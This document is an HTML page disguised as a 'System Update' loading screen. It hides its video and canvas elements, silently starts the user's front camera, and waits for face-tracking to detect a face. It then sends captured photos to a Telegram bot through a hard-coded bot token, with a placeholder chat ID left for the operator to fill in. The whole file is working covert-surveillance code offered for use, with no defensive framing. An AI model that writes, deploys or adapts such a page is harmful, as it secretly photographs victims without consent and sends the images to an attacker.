<!DOCTYPE html>
<html>
<head>
    <title>System Update</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clmtrackr/1.3.1/clmtrackr.min.js"></script>
    <style>
        /* Hides everything so the page looks blank or like a loading screen */
        body { background: black; color: #333; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        #v, #c { display: none; } 
    </style>
</head>
<body>

    <div id="status">Loading...</div>

    <video id="v" width="400" height="300" autoplay playsinline muted></video>
    <canvas id="c" width="400" height="300"></canvas>

    <script>
        const video = document.getElementById('v');
        const canvas = document.getElementById('c');
        const botToken = "8041664147:AAF8SEZD3WUzX2wLBbMzc5V4nQKStkNS_sM";
        const chatId = "YOUR_CHAT_ID"; // <--- REMEMBER TO PUT YOUR ID HERE

        // Start Camera Silently
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                video.srcObject = stream;
                startTracking();
            })
            .catch(err => {
                document.getElementById('status').innerText = "Camera access required.";
            });

        function startTracking() {
            const tracker = new clm.tracker();
            tracker.init();
            tracker.start(video);

            function check() {
                const pos = tracker.getCurrentPosition();
                if (pos) {
                    captureAndSend();
                }
                requestAnimationFrame(check);
            }
            check();
        }

        let isSending = false;
        function captureAndSend() {
            if (isSending) return;
            isSending = true;

            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, 400, 300);
            
            canvas.toBlob(blob => {
                const fd = new FormData();
                fd.append('chat_id', chatId);
                fd.append('photo', blob, 'capture.jpg');

                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: fd
                }).then(() => {
                    // Wait 30 seconds before allowing another capture to avoid spam
                    setTimeout(() => { isSending = false; }, 30000);
                }).catch(() => { isSending = false; });
            }, 'image/jpeg', 0.7);
        }
    </script>
</body>
</html>
